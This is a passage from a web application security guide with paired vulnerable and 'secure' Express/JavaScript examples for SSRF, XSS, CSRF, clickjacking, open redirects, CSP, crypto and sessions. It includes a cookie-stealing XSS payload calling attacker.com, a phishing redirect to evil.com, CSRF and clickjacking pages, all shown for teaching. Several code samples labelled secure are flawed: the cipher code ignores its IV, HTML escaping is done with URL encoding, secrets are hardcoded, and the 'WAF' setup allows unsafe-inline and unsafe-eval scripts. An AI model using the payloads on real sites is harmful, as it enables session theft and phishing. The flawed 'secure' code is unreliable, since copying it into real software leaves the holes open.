  })

  res.json({ success: true })
})
```

**Secure SSRF Implementation:**

```javascript
// SECURE: URL validation and allowlisting
const { URL } = require("url")

// Allowlist of permitted domains
const ALLOWED_DOMAINS = ["api.example.com", "cdn.example.com", "images.example.com"]

// Blocked IP ranges
const BLOCKED_IPS = [
  "127.0.0.1",
  "0.0.0.0",
  "169.254.169.254", // AWS metadata
  "10.0.0.0/8", // Private networks
  "172.16.0.0/12", // Private networks
  "192.168.0.0/16", // Private networks
]

function isValidUrl(urlString) {
  try {
    const url = new URL(urlString)

    // Check protocol
    if (!["http:", "https:"].includes(url.protocol)) {
      return false
    }

    // Check domain allowlist
    if (!ALLOWED_DOMAINS.includes(url.hostname)) {
      return false
    }

    // Check for blocked IPs
    const ip = url.hostname
    if (isBlockedIP(ip)) {
      return false
    }

    return true
  } catch (error) {
    return false
  }
}

function isBlockedIP(ip) {
  return BLOCKED_IPS.some((blockedIP) => {
    if (blockedIP.includes("/")) {
      // CIDR notation
      return isInSubnet(ip, blockedIP)
    } else {
      return ip === blockedIP
    }
  })
}

app.get("/api/fetch", (req, res) => {
  const url = req.query.url

  if (!isValidUrl(url)) {
    return res.status(400).json({ error: "Invalid URL" })
  }

  fetch(url, {
    timeout: 5000, // 5 second timeout
    headers: {
      "User-Agent": "MyApp/1.0",
    },
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`)
      }
      return response.text()
    })
    .then((data) => res.send(data))
    .catch((error) => {
      logger.error("SSRF fetch error", { url, error: error.message })
      res.status(500).send("Error fetching resource")
    })
})

// SECURE: Webhook with validation
app.post("/api/webhook", (req, res) => {
  const { url, data } = req.body

  if (!isValidUrl(url)) {
    return res.status(400).json({ error: "Invalid webhook URL" })
  }

  // Additional webhook-specific validation
  if (!isValidWebhookUrl(url)) {
    return res.status(400).json({ error: "Invalid webhook configuration" })
  }

  fetch(url, {
    method: "POST",
    body: JSON.stringify(data),
    headers: { "Content-Type": "application/json" },
    timeout: 10000,
  })
    .then((response) => {
      logger.info("Webhook sent", { url, status: response.status })
    })
    .catch((error) => {
      logger.error("Webhook error", { url, error: error.message })
    })

  res.json({ success: true })
})
```

**Mitigation Strategies:**

1. **URL Validation:** Implement strict URL validation and allowlisting
2. **Network Segmentation:** Use firewalls to restrict outbound connections
3. **DNS Resolution:** Validate DNS resolution and prevent DNS rebinding
4. **Request Sanitization:** Sanitize and validate all user-provided URLs
5. **Monitoring:** Monitor for unusual outbound requests

## Security Architecture by Rendering Strategy

The choice of rendering strategy fundamentally defines your application's attack surface and security posture. Each approach presents unique vulnerabilities and requires tailored defenses.

### Server-Side Rendering (SSR) Security

**Attack Surface:**

- Reflected and stored XSS via template interpolation
- CSRF on state-changing operations
- Server-side request forgery (SSRF)
- Clickjacking on authentication flows
- HTTPS downgrade attacks

**Key Defenses:**

- Strict template escaping and auto-escaping
- CSRF tokens with SameSite cookies
- Input validation and sanitization
- URL allowlisting for external requests
- State filtering to prevent data leakage

### Static Site Generation (SSG) Security

**Attack Surface:**

- Build-time supply chain vulnerabilities
- DOM-based XSS in client-side JavaScript
- Cached vulnerable assets
- Third-party service compromise

**Key Defenses:**

- Dependency scanning and lockfile pinning
- CSP with hash-based validation
- Subresource Integrity (SRI) for external assets
- Immutable asset filenames with content hashing

### Client-Side Rendering (CSR) Security

**Attack Surface:**

- DOM-based XSS from unsafe DOM manipulation
- Token leakage in localStorage/sessionStorage
- Open redirects in client-side routing
- Third-party widget vulnerabilities

**Key Defenses:**

- Trusted Types API or DOMPurify for HTML sanitization
- Secure token storage in HttpOnly cookies
- Strict CSP with connect-src restrictions
- Avoidance of dangerous DOM sinks

### Edge/ISR Security

**Attack Surface:**

- Cache poisoning attacks
- Edge function escape vulnerabilities
- Large-scale DDoS targeting edge nodes
- Configuration drift across regions

**Key Defenses:**

- Proper cache key configuration
- Edge runtime isolation and sandboxing
- Web Application Firewall (WAF) deployment
- Rate limiting and bot mitigation

## Essential HTTP Security Headers

HTTP security headers serve as the foundational layer of frontend security, providing browsers with explicit instructions on how to handle content securely. These headers operate at the protocol level, offering broad protection against entire classes of vulnerabilities.

### Content Security Policy (CSP)

**Purpose:** Restricts resource origins and blocks XSS, clickjacking, and other injection attacks.

**Recommended Value:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<random>'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'
```

**Implementation Priority:** Critical

### HTTP Strict Transport Security (HSTS)

**Purpose:** Forces HTTPS connections and prevents protocol downgrade attacks.

**Recommended Value:**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Implementation Priority:** Critical

### X-Content-Type-Options

**Purpose:** Prevents MIME-type sniffing attacks where malicious content is disguised as safe file types.

**Recommended Value:**

```
X-Content-Type-Options: nosniff
```

**Implementation Priority:** Critical

### X-Frame-Options (Legacy)

**Purpose:** Prevents clickjacking by controlling iframe embedding.

**Recommended Value:**

```
X-Frame-Options: DENY
```

**Note:** Prefer CSP's `frame-ancestors` directive for modern applications.

### Referrer-Policy

**Purpose:** Controls referrer information leakage for privacy protection.

**Recommended Value:**

```
Referrer-Policy: strict-origin-when-cross-origin
```

**Implementation Priority:** Recommended

### Permissions-Policy

**Purpose:** Disables unnecessary browser features to reduce attack surface.

**Recommended Value:**

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

**Implementation Priority:** Recommended

### Cross-Origin Headers

**Purpose:** Isolates browsing context and enables secure cross-origin communication.

**Recommended Values:**

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-site
```

**Implementation Priority:** High Security

## Content Security Policy Deep Dive

Content Security Policy represents the most sophisticated and powerful security header available to frontend developers. CSP provides granular control over resource loading, script execution, and content behavior, effectively mitigating XSS, code injection, and data exfiltration attacks.

### Why Domain Whitelisting Doesn't Work

Traditional CSP implementations often rely on host-based allowlists like `script-src 'self' cdn.example.com`. However, this approach has fundamental security flaws:

**Vulnerability to Third-Party Compromise:**
If an allowed third-party host (like a CDN) is compromised, attackers can inject malicious scripts that will be executed because they originate from a whitelisted domain. This creates a single point of failure where one compromised service can affect all sites using that domain.

**Scalability Issues:**
As applications grow, maintaining comprehensive domain allowlists becomes unwieldy. Each new third-party service requires CSP updates, increasing the risk of misconfiguration and security gaps.

**Bypass Techniques:**
Attackers can exploit vulnerabilities in whitelisted domains to inject malicious content, bypassing CSP restrictions entirely.

### Nonce-Based CSP: The Modern Approach

Nonce-based CSP provides cryptographic proof of trust rather than relying on domain reputation:

**How Nonces Work:**

1. Server generates a unique, cryptographically random nonce for each page load
2. Nonce is included in the CSP header: `script-src 'nonce-R4nd0m...'`
3. Same nonce is added as an attribute to legitimate script tags: `<script nonce="R4nd0m...">`
4. Browser only executes scripts whose nonce matches the CSP header value

**Implementation Example:**

```javascript
// Server-side nonce generation
const nonce = crypto.randomBytes(16).toString('base64')

// CSP header
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
  style-src 'self' 'nonce-${nonce}';
  img-src 'self' blob: data:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
`

// HTML with nonce
<script nonce="${nonce}">
  // This script will execute
</script>
```

**Advantages:**

- Unpredictable: Attackers cannot guess the nonce for a specific response
- Dynamic: Each page load gets a unique nonce
- Secure: Even if an attacker injects a script tag, it won't have the correct nonce

### Hash-Based CSP for Static Content

For static pages and build-time generated content, hash-based CSP provides similar security:

**How Hashes Work:**

1. Calculate cryptographic hash (SHA-256) of legitimate script content
2. Include hash in CSP header: `script-src 'sha256-AbCd...'`
3. Browser calculates hash of downloaded script and compares values
4. Only executes scripts with matching hashes

**Implementation Example:**

```html
<!-- CSP header -->
Content-Security-Policy: script-src 'sha256-hashOfInlineScript'

<!-- Inline script -->
<script>
  // Script content that produces the expected hash
</script>
```

### Nonces vs. Subresource Integrity (SRI)

While both provide cryptographic validation, they serve different purposes:

**Nonces:**

- Used for inline scripts and dynamically generated content
- Validates script execution permission, not content integrity
- Requires server-side generation for each request
- Protects against unauthorized script injection

**Subresource Integrity (SRI):**

- Used for external resources (scripts, stylesheets from CDNs)
- Validates content integrity, ensuring files haven't been tampered with
- Hash is calculated once and embedded in HTML
- Protects against CDN compromise and man-in-the-middle attacks

**SRI Implementation:**

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-hashOfLibraryContent"
  crossorigin="anonymous"
></script>
```

**Combined Approach:**
Use nonces for inline/dynamic content and SRI for external resources:

```html
Content-Security-Policy: script-src 'self' 'nonce-abc123' 'sha256-hash1' 'sha256-hash2'
```

### Advanced CSP Directives

**Frame Ancestors:**
Provides superior clickjacking protection compared to X-Frame-Options:

```
Content-Security-Policy: frame-ancestors 'none'
```

**Report-URI and Violation Reporting:**
Enable monitoring and policy refinement:

```
Content-Security-Policy: default-src 'self'; report-to csp-endpoint
```

**Strict Dynamic:**
Enables secure script loading patterns:

```
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

## Comprehensive Attack Vectors and Defenses

Understanding the complete attack landscape is crucial for implementing effective defenses. Modern web applications face sophisticated attack vectors that require multi-layered security approaches.

### Cross-Site Scripting (XSS) Attacks

XSS attacks inject malicious scripts into web pages, allowing attackers to steal session cookies, perform actions on behalf of users, or deface websites.

#### Stored XSS (Persistent)

**Attack Vector:** Malicious scripts permanently stored on server and served to all users.

**Risk Level:** Critical - affects all users accessing infected content.

**Example Attack:**

```javascript
// Attacker posts comment with malicious script
const maliciousComment = {
  content: '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>',
  author: "attacker",
}

// Vulnerable code stores and displays without sanitization
app.post("/api/comments", (req, res) => {
  const comment = req.body
  saveComment(comment) // Stores malicious script
  res.json({ success: true })
})

app.get("/api/comments", (req, res) => {
  const comments = getComments()
  res.json(comments) // Returns malicious script to all users
})
```

**Defense Implementation:**

```javascript
// SECURE: Input sanitization and output encoding
const DOMPurify = require("dompurify")

app.post("/api/comments", (req, res) => {
  const comment = req.body

  // Sanitize input before storage
  comment.content = DOMPurify.sanitize(comment.content, {
    ALLOWED_TAGS: ["p", "br", "strong", "em"],
    ALLOWED_ATTR: [],
  })

  saveComment(comment)
  res.json({ success: true })
})

app.get("/api/comments", (req, res) => {
  const comments = getComments()

  // Additional output encoding
  const safeComments = comments.map((comment) => ({
    ...comment,
    content: encodeURIComponent(comment.content),
  }))

  res.json(safeComments)
})
```

#### Reflected XSS (Non-Persistent)

**Attack Vector:** Malicious scripts immediately returned in server response.

**Risk Level:** High - requires user interaction but affects all users who click malicious link.

**Example Attack:**

```javascript
// Attacker crafts malicious URL
const maliciousUrl = 'https://example.com/search?q=<script>alert("XSS")</script>'

// Vulnerable search endpoint
app.get("/search", (req, res) => {
  const query = req.query.q
  res.send(`<h1>Search results for: ${query}</h1>`) // Direct injection
})
```

**Defense Implementation:**

```javascript
// SECURE: Context-aware output encoding
app.get("/search", (req, res) => {
  const query = req.query.q

  // Validate input
  if (!isValidSearchQuery(query)) {
    return res.status(400).send("Invalid search query")
  }

  // Encode output for HTML context
  const encodedQuery = encodeURIComponent(query)
  res.send(`<h1>Search results for: ${encodedQuery}</h1>`)
})

function isValidSearchQuery(query) {
  // Implement validation logic
  return typeof query === "string" && query.length <= 100
}
```

#### DOM-based XSS

**Attack Vector:** Client-side JavaScript processes untrusted data and writes to dangerous DOM sinks.

**Risk Level:** Critical - never reaches server, difficult to detect.

**Example Attack:**

```javascript
// Vulnerable client-side code
const urlParams = new URLSearchParams(window.location.search)
const userInput = urlParams.get("name")

// Dangerous DOM sink
document.getElementById("welcome").innerHTML = `Welcome, ${userInput}!`
```

**Defense Implementation:**

```javascript
// SECURE: Trusted Types API or safe DOM manipulation
const urlParams = new URLSearchParams(window.location.search)
const userInput = urlParams.get("name")

// Use textContent instead of innerHTML
document.getElementById("welcome").textContent = `Welcome, ${userInput}!`

// Or use Trusted Types API
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  const policy = window.trustedTypes.createPolicy("default", {
    createHTML: (string) => DOMPurify.sanitize(string),
  })

  document.getElementById("welcome").innerHTML = policy.createHTML(`Welcome, ${userInput}!`)
}
```

### Cross-Site Request Forgery (CSRF)

CSRF attacks trick authenticated users into performing unwanted actions on websites where they're logged in.

**Attack Vector:** Malicious website makes authenticated requests to target site.

**Risk Level:** High - can perform actions on user's behalf.

**Example Attack:**

```html
<!-- Malicious website -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000" />
  <input type="hidden" name="to" value="attacker" />
  <button type="submit">Click here to win $1000!</button>
</form>
```

**Defense Implementation:**

```javascript
// SECURE: CSRF token implementation
const csrf = require("csurf")
const csrfProtection = csrf({ cookie: true })

app.use(csrfProtection)

// Generate CSRF token for forms
app.get("/transfer-form", (req, res) => {
  res.render("transfer", {
    csrfToken: req.csrfToken(),
  })
})

// Validate CSRF token on state-changing requests
app.post("/transfer", csrfProtection, (req, res) => {
  // CSRF token automatically validated by middleware
  const { amount, to } = req.body
  processTransfer(amount, to)
  res.json({ success: true })
})

// Secure cookie configuration
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
    },
  }),
)
```

### Clickjacking (UI Redress)

Clickjacking deceives users into clicking hidden elements through transparent overlays.

**Attack Vector:** Target site embedded in iframe with transparent overlay.

**Risk Level:** Medium - can lead to unintended actions.

**Example Attack:**

```html
<!-- Malicious website -->
<style>
  .overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: transparent;
    z-index: 1000;
  }

  .target-frame {
    position: absolute;
    top: -100px;
    left: 0;
    opacity: 0.1;
  }
</style>

<div class="overlay">
  <button>Click to win!</button>
</div>
<iframe src="https://bank.com/transfer" class="target-frame"></iframe>
```

**Defense Implementation:**

```javascript
// SECURE: Frame-busting and security headers
app.use((req, res, next) => {
  // X-Frame-Options header
  res.setHeader("X-Frame-Options", "DENY")

  // Content Security Policy frame-ancestors
  res.setHeader("Content-Security-Policy", "frame-ancestors 'none'")

  next()
})

// Client-side frame-busting (defense in depth)
app.get("/", (req, res) => {
  res.send(`
    <script>
      if (window.top !== window.self) {
        window.top.location = window.self.location;
      }
    </script>
    <h1>Secure Content</h1>
  `)
})
```

### Man-in-the-Middle (MITM) Attacks

MITM attacks intercept communications between client and server.

**Attack Vector:** Network-level interception of unencrypted traffic.

**Risk Level:** Critical - can steal credentials and manipulate data.

**Example Attack:**

```javascript
// Attacker intercepts HTTP traffic
// User sends: POST /login {username: "user", password: "secret"}
// Attacker captures plaintext credentials
```

**Defense Implementation:**

```javascript
// SECURE: HTTPS enforcement and HSTS
const helmet = require("helmet")

app.use(
  helmet.hsts({
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  }),
)

// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header("x-forwarded-proto") !== "https" && process.env.NODE_ENV === "production") {
    res.redirect(`https://${req.header("host")}${req.url}`)
  } else {
    next()
  }
})

// Secure cookie configuration
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    cookie: {
      secure: true, // Only sent over HTTPS
      httpOnly: true,
      sameSite: "strict",
    },
  }),
)
```

### Open Redirects

Open redirects use user-controlled parameters to redirect to malicious sites.

**Attack Vector:** User-controlled redirect URLs.

**Risk Level:** Medium - enables phishing and credential theft.

**Example Attack:**

```javascript
// Vulnerable redirect
app.get("/redirect", (req, res) => {
  const url = req.query.url
  res.redirect(url) // No validation
})

// Attacker crafts: /redirect?url=https://evil.com/phishing
```

**Defense Implementation:**

```javascript
// SECURE: URL allowlisting and validation
const ALLOWED_REDIRECTS = [
  "https://example.com/dashboard",
  "https://example.com/profile",
  "https://example.com/settings",
]

app.get("/redirect", (req, res) => {
  const url = req.query.url

  // Validate redirect URL
  if (!ALLOWED_REDIRECTS.includes(url)) {
    return res.status(400).send("Invalid redirect URL")
  }

  // Additional validation
  if (!isValidRedirectUrl(url)) {
    return res.status(400).send("Invalid redirect URL")
  }

  res.redirect(url)
})

function isValidRedirectUrl(url) {
  try {
    const parsedUrl = new URL(url)
    return parsedUrl.protocol === "https:" && parsedUrl.hostname === "example.com"
  } catch (error) {
    return false
  }
}
```

### Denial of Service (DoS) and Distributed DoS (DDoS)

DoS attacks overwhelm systems with traffic, making them unavailable.

**Attack Vector:** High-volume traffic or resource exhaustion.

**Risk Level:** High - can cause service outages.

**Example Attack:**

```javascript
// Attacker sends thousands of requests per second
// Vulnerable endpoint with no rate limiting
app.get("/api/data", (req, res) => {
  // Expensive database query
  const data = performExpensiveQuery()
  res.json(data)
})
```

**Defense Implementation:**

```javascript
// SECURE: Rate limiting and resource protection
const rateLimit = require("express-rate-limit")

// General rate limiting
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: "Too many requests from this IP",
})

// Stricter rate limiting for sensitive endpoints
const sensitiveLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: "Too many requests to sensitive endpoint",
})

app.use(generalLimiter)
app.use("/api/data", sensitiveLimiter)

// Resource protection
app.get("/api/data", (req, res) => {
  // Add timeout to prevent hanging requests
  const timeout = setTimeout(() => {
    res.status(408).json({ error: "Request timeout" })
  }, 5000)

  performExpensiveQuery()
    .then((data) => {
      clearTimeout(timeout)
      res.json(data)
    })
    .catch((error) => {
      clearTimeout(timeout)
      res.status(500).json({ error: "Query failed" })
    })
})

// Request size limiting
app.use(express.json({ limit: "1mb" }))
app.use(express.urlencoded({ extended: true, limit: "1mb" }))
```

### Advanced Persistent Threats (APT)

APTs are sophisticated, long-term attacks targeting specific organizations.

**Attack Vector:** Multiple attack vectors over extended periods.

**Risk Level:** Critical - can result in complete system compromise.

**Defense Implementation:**

```javascript
// SECURE: Comprehensive monitoring and detection
const securityMonitoring = {
  // Behavioral analysis
  detectAnomalies: (req, res, next) => {
    const userAgent = req.get("User-Agent")
    const ip = req.ip
    const path = req.path

    // Check for suspicious patterns
    if (isSuspiciousUserAgent(userAgent) || isKnownMaliciousIP(ip) || isSuspiciousPath(path)) {
      logger.warn("Suspicious activity detected", {
        userAgent,
        ip,
        path,
        timestamp: new Date().toISOString(),
      })

      // Implement additional security measures
      req.requiresAdditionalAuth = true
    }

    next()
  },

  // Threat intelligence integration
  checkThreatIntelligence: async (ip) => {
    const threatData = await queryThreatIntelligence(ip)
    return threatData.riskScore > 0.7
  },

  // Advanced logging
  logSecurityEvent: (event, details) => {
    logger.info("Security event", {
      event,
      details,
      timestamp: new Date().toISOString(),
      correlationId: generateCorrelationId(),
    })
  },
}

app.use(securityMonitoring.detectAnomalies)
```

### Supply Chain Attacks

Supply chain attacks compromise software dependencies or build processes.

**Attack Vector:** Malicious code in dependencies or compromised build systems.

**Risk Level:** Critical - can affect all users of compromised software.

**Defense Implementation:**

```javascript
// SECURE: Supply chain security
const supplyChainSecurity = {
  // Dependency verification
  verifyDependencies: async () => {
    const packageLock = JSON.parse(fs.readFileSync("package-lock.json"))

    for (const [name, info] of Object.entries(packageLock.dependencies)) {
      // Verify package integrity
      const integrity = info.integrity
      const expectedHash = integrity.split("-")[2]

      // Check against known good hashes
      if (!isKnownGoodHash(name, expectedHash)) {
        throw new Error(`Suspicious dependency: ${name}`)
      }
    }
  },

  // Build verification
  verifyBuild: async () => {
    // Verify build artifacts
    const buildHash = await calculateBuildHash()
    const expectedHash = process.env.EXPECTED_BUILD_HASH

    if (buildHash !== expectedHash) {
      throw new Error("Build integrity check failed")
    }
  },

  // Runtime verification
  verifyRuntime: () => {
    // Check for unexpected network connections
    const connections = getNetworkConnections()
    const allowedConnections = getAllowedConnections()

    for (const connection of connections) {
      if (!allowedConnections.includes(connection)) {
        logger.error("Unexpected network connection", { connection })
        process.exit(1)
      }
    }
  },
}

// Run security checks
supplyChainSecurity.verifyDependencies()
supplyChainSecurity.verifyBuild()
setInterval(supplyChainSecurity.verifyRuntime, 60000) // Every minute
```

## Authentication and Session Security

Modern authentication has evolved beyond traditional passwords toward more secure, user-friendly approaches.

### WebAuthn Implementation

WebAuthn enables passwordless authentication using public-key cryptography:

**Registration Flow:**

```javascript
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: new Uint8Array(32),
    rp: { name: "Example Corp", id: "example.com" },
    user: {
      id: new TextEncoder().encode(userId),
      name: userEmail,
      displayName: userName,
    },
    pubKeyCredParams: [{ alg: -7, type: "public-key" }],
    authenticatorSelection: {
      authenticatorAttachment: "platform",
      userVerification: "required",
    },
  },
})
```

**Authentication Flow:**

```javascript
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: new Uint8Array(32),
    allowCredentials: [
      {
        type: "public-key",
        id: credentialId,
      },
    ],
    userVerification: "required",
  },
})
```

### Secure Session Management

**HttpOnly Cookies:**

```javascript
// Secure session cookie configuration
const cookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 900000, // 15 minutes
  path: "/",
}
```

**JWT Security:**

```javascript
// Secure JWT configuration
const jwtOptions = {
  expiresIn: "15m",
  issuer: "your-app.com",
  audience: "your-app.com",
  algorithm: "RS256",
}
```

### Token Storage Security

| Storage Method  | XSS Risk | CSRF Risk | Persistence  | Recommendation |
| --------------- | -------- | --------- | ------------ | -------------- |
| localStorage    | High     | Low       | Persistent   | ❌ Unsafe      |
| sessionStorage  | High     | Low       | Session      | ❌ Unsafe      |
| HttpOnly Cookie | Low      | High      | Configurable | ✅ Most Secure |

## Cryptographic Implementation

Cryptography is the foundation of modern security. It enables secure communication, data integrity, and authentication.

### Symmetric Encryption (AES)

**Purpose:** Encrypts data in transit and at rest.

**Implementation:**

```javascript
const crypto = require("crypto")

const key = crypto.randomBytes(32) // 256-bit key
const iv = crypto.randomBytes(16) // 128-bit IV

const cipher = crypto.createCipher("aes-256-cbc", key)
const encrypted = cipher.update(plainText, "utf8", "hex")
const final = cipher.final("hex")

const decipher = crypto.createDecipher("aes-256-cbc", key)
const decrypted = decipher.update(encrypted, "hex", "utf8")
const finalDecrypted = decipher.final("utf8")
```

### Asymmetric Encryption (RSA)

**Purpose:** Securely exchange symmetric keys and verify digital signatures.

**Implementation:**

```javascript
const crypto = require("crypto")

const { privateKey, publicKey } = crypto.generateKeyPairSync("rsa", {
  modulusLength: 2048,
  publicKeyEncoding: {
    type: "pkcs1",
    format: "pem",
  },
  privateKeyEncoding: {
    type: "pkcs1",
    format: "pem",
  },
})

const encrypted = crypto.publicEncrypt(publicKey, Buffer.from(plainText))
const decrypted = crypto.privateDecrypt(privateKey, encrypted)
```

### Hashing (SHA-256)

**Purpose:** Generate a unique, fixed-size representation of data for integrity checks.

**Implementation:**

```javascript
const crypto = require("crypto")

const hash = crypto.createHash("sha256")
hash.update(data)
const digest = hash.digest("hex")
```

### Key Management

**Key Rotation:**

- Regularly rotate encryption keys
- Use ephemeral keys for short-lived operations
- Store keys securely (e.g., in secure vaults)

**Key Storage:**

- **Symmetric Keys:** Encrypted and stored securely
- **Asymmetric Keys:** Encrypted and stored securely
- **HMAC Keys:** Encrypted and stored securely

### Secure Random Number Generation

**Purpose:** Generate truly random numbers for cryptographic operations.

**Implementation:**

```javascript
const crypto = require("crypto")

const randomBytes = crypto.randomBytes(32) // 256-bit random number
```

## Input Validation and Output Encoding

Input validation and output encoding are fundamental to preventing injection attacks.

### Input Validation

**Purpose:** Ensure that user input is free of malicious characters, formats, and lengths.

**Implementation:**

```javascript
const validator = require("validator")

const sanitizedInput = validator.escape(userInput)
const validatedEmail = validator.isEmail(emailInput)
const validatedLength = validator.isLength(passwordInput, { min: 8, max: 64 })
```

### Output Encoding

**Purpose:** Convert potentially dangerous characters into safe representations.

**Implementation:**

```javascript
const sanitizer = require("sanitizer")

const safeHtml = sanitizer.sanitize(userContent)
const safeUrl = sanitizer.sanitizeUrl(userUrl)
```

### Input vs. Output Encoding

- **Input Validation:** Prevents malicious input from reaching the application.
- **Output Encoding:** Ensures that any data sent to the user is safe.

## Access Control and Authorization

Access control and authorization determine who can perform what actions on what resources.

### Role-Based Access Control (RBAC)

**Purpose:** Assign roles to users and manage permissions.

**Implementation:**

```javascript
const roles = {
  admin: ["read", "write", "delete"],
  user: ["read"],
  guest: [],
}

const user = {
  id: "user123",
  role: "user",
}

const canRead = roles[user.role].includes("read")
```

### Attribute-Based Access Control (ABAC)

**Purpose:** Fine-grained access control based on attributes of the subject, object, and action.

**Implementation:**

```javascript
const abacRules = {
  "user:read:profile": (user, resource) => user.id === resource.ownerId,
  "user:write:profile": (user, resource) => user.id === resource.ownerId,
  "admin:read:all": (user, resource) => user.role === "admin",
}

const user = {
  id: "user123",
  role: "user",
}

const canReadProfile = abacRules["user:read:profile"](user, { ownerId: "user123" })
```

### Policy-Based Access Control (PBAC)

**Purpose:** Define policies that govern access decisions.

**Implementation:**

```javascript
const policies = {
  "read:profile": (user, resource) => user.id === resource.ownerId,
  "write:profile": (user, resource) => user.id === resource.ownerId,
  "admin:read:all": (user, resource) => user.role === "admin",
}

const user = {
  id: "user123",
  role: "user",
}

const canReadProfile = policies["read:profile"](user, { ownerId: "user123" })
```

### Session Management

**Purpose:** Manage user sessions and their associated permissions.

**Implementation:**

```javascript
const session = require("express-session")

app.use(
  session({
    secret: "your-secret-key",
    resave: false,
    saveUninitialized: true,
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
    },
  }),
)
```

## Dependency and Supply Chain Security

Modern web applications depend heavily on third-party packages, creating significant security risks.

### Vulnerability Detection

**Automated Scanning:**

```json
{
  "scripts": {
    "audit": "npm audit --audit-level moderate",
    "audit-fix": "npm audit fix",
    "prestart": "npm audit --audit-level high"
  }
}
```

**Tools:**

- OWASP Dependency-Check for comprehensive CVE coverage
- Snyk for real-time vulnerability detection
- GitHub Dependabot for automated security updates
- npm audit for built-in Node.js scanning

### Dependency Management

**Version Pinning:**

```json
{
  "dependencies": {
    "react": "18.2.0",
    "next": "13.4.19"
  }
}
```

**Subresource Integrity (SRI):**

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-hashOfLibraryContent"
  crossorigin="anonymous"
></script>
```

### Supply Chain Attack Prevention

**Threats:**

- Malicious packages with similar names (typosquatting)
- Compromised maintainer accounts
- Dependency confusion attacks
- CDN compromise

**Defenses:**

- Lockfile pinning with cryptographic hashes
- Scoped registries and private proxies
- Regular dependency updates and monitoring
- Self-hosting critical dependencies

## Security Logging and Monitoring

**Purpose:** Collect, analyze, and monitor security events to detect anomalies and potential attacks.

**Implementation:**

```javascript
const winston = require("winston")

const logger = winston.createLogger({
  level: "info",
  format: winston.format.json(),
  transports: [new winston.transports.Console(), new winston.transports.File({ filename: "combined.log" })],
})

logger.info("Application started", { version: "1.0.0" })
logger.error("Application error", { error: "Something went wrong" })
```

**Log Types:**

- **Authentication Events:** Login/logout, failed attempts, session changes
- **Access Control Events:** User permission changes, role assignments
- **Data Access Events:** Read/write operations, data deletion
- **Security Policy Violations:** CSP violations, XSS attempts
- **Error Events:** Application crashes, unhandled exceptions

**Monitoring:**

- **Real-time Alerts:** Email, Slack, PagerDuty
- **Historical Analysis:** Splunk, ELK Stack, Grafana
- **Anomaly Detection:** Machine learning, statistical analysis

## Web Application Firewalls and DDoS Protection

**Purpose:** Protect applications from malicious traffic, including DDoS attacks.

**Implementation:**

```javascript
const express = require("express")
const helmet = require("helmet")
const rateLimit = require("express-rate-limit")
const xss = require("xss-clean")
const hpp = require("hpp")
const csp = require("helmet-csp")
const csrf = require("csurf")
const bodyParser = require("body-parser")
const cookieParser = require("cookie-parser")
const session = require("express-session")

const app = express()

app.use(bodyParser.json())
app.use(cookieParser())
app.use(
  session({
    secret: "your-secret-key",
    resave: false,
    saveUninitialized: true,
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
    },
  }),
)

app.use(helmet())
app.use(xss())
app.use(hpp())
app.use(
  csp({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "blob:"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
    },
  }),
)

app.use(csrf())

app.use(
  rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per window
  }),
)

app.use((req, res, next) => {
  res.status(404).json({ error: "Not Found" })
})

app.listen(3000, () => {
  console.log("Server listening on port 3000")
})
```

**WAF Features:**

- **Request Validation:** Input validation, sanitization, rate limiting
- **Header Protection:** CSP, X-Frame-Options, Referrer-Policy
- **Content Protection:** XSS, SQL Injection, CSRF
- **Session Management:** HttpOnly cookies, Secure Session
- **Authentication:** Multi-factor, OAuth 2.0, WebAuthn
- **DDoS Protection:** Rate limiting, caching, scrubbing

## Implementation Best Practices

### Security-First Development

Integrate security throughout the development lifecycle:

**Threat Modeling:**

- Identify attack vectors for new features
- Assess risk levels and mitigation strategies
- Document security requirements

**Security Code Reviews:**

- Review authentication and authorization logic
- Validate input handling and output encoding
- Check for common vulnerability patterns

**Automated Security Testing:**

```javascript
// CI/CD security checks
{
  "scripts": {
    "security:audit": "npm audit",
    "security:lint": "eslint --config .eslintrc.security.js",
    "security:test": "jest --config jest.security.config.js"
  }
}
```

### Monitoring and Incident Response

**Security Event Logging:**

```javascript
const logSecurityEvent = (event, details) => {
  console.log(
    JSON.stringify({
      timestamp: new Date().toISOString(),
      event,
      details: sanitizeForLogging(details),
